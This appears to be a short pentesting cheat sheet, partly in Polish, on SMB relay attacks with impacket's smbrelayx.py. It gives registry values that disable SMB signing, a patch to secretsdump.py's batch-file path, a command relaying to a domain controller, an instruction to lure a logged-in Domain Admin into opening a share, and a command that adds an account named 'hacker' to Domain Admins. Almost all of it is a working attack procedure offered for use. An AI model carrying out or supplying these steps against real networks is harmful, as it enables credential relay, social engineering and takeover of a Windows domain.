## smbrelayx.py (impacket)
### Intro
SMB Relay attacks
### Preq
Disable SMB Signing
Computer\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters  
enablesecuritysignature -> 0  
requiresecuritysignature -> 0  
Enable SMBv1 Enable-WindowsOptionalFeature -Online -FeatureName smb1protocol  
Share folders and printers  
### Config
#### Error - SMB SessionError: "STATUS_OBJECT_NAME_NOT_FOUND"  
12.2020 - dla najnowszej wersji Windows 2016 konieczna zmina miejsca gnenerowania pliku wykonywalnego po stronie ofiary
``/usr/lib/python3/dist-packages/impacket/examples/secretsdump.py``  
z  
``self.__batchFile = '%TEMP%\\execute.bat'``  
na  
``self.__batchFile = 'C:\\Folder\\execute.bat'``
### Uses
1. Uruchom Relay SMB stacji w podsieci  
``sudo python3 /usr/share/doc/python3-impacket/examples/smbrelayx.py -h _IP_DOMAIN_CONTROLER_ -c "_COMMAND_"``
2. Przekonaj klienta z zalogowanych Domain Admin na próbe otwarcia smb share na spreparowanej stacji
3. _COMMAND_ - zosatnie wykonane np.  
``ipconfig``  
``net group "Domain Admins" hacker /ADD /DOMAIN``


